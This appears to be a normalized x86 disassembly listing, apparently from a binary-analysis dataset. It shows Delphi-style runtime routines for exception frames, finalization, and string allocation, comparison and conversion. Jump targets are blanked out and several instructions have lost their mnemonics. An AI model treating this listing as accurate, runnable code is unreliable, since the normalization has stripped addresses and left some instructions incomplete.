sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403ab4
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403adc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b22
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b82
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403bdc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_4059b8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c00
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_4059b8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c28
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c4c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403ca8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403cd8
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403d64
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c4c
call sub_403cd8
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403adc
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403ab4
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405484
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403ca8
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e54
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403e78
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403ea8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f18
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403eec
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403f18
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403f44
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f18
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403e54
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_403f74
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403f94
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_403fb0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403e54
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4044a0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403f74
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403f74
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4044a0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403f44
jmp r-xdata
sub_40404c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403f44
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_40407c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fb0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4040c4
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403f44
not ecx
sub_4040f0
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_40411c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ea8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4044a0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4044a0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_404160
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ea8
test ecx ecx
je sub_403ea8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40411c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f18
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ea8
pop edx
pop eax
jmp sub_40411c
call sub_403ea8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4041d4
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f18
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4044a0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ea8
dec [ edx - 0x8 ]
sub_404260
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404320
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f18
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_404374
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403e54
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403f44
jmp r-xdata
pop ebx
retn 0x4
sub_4043b4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404320
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4044a0
mov edi ecx
sub_4043fc
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4044a0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404458
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4044a0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403e54
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f18
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40454c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404570
test edx edx
je sub_404534
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404534
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_404594
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404534
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_40477c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403f94
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403f94
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40477c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404620
jmp r-xdata
sub_404620
test ecx ecx
je sub_404534
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404644
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404620
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4046ac
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404730
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4046a0
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404620
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_40477c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404524
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40450c
mov ebx eax
mov eax [ edi ]
call sub_4046a0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_4047c0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4047f0
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4047f0
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4047f0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4047c0
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404890
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048dc
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4048dc
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403e78
jmp r-xdata
call sub_403e54
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40454c
jmp r-xdata
call sub_404534
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4048c4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048dc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404890
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4054f4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404e14
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_4049ec
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403ea8
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404570
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_4049d4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b08
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_4049ec
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40550c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404e50
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404b08
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ea8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404570
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4049d4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b08
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_4049ec
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40550c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404e50
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c28
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404c7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
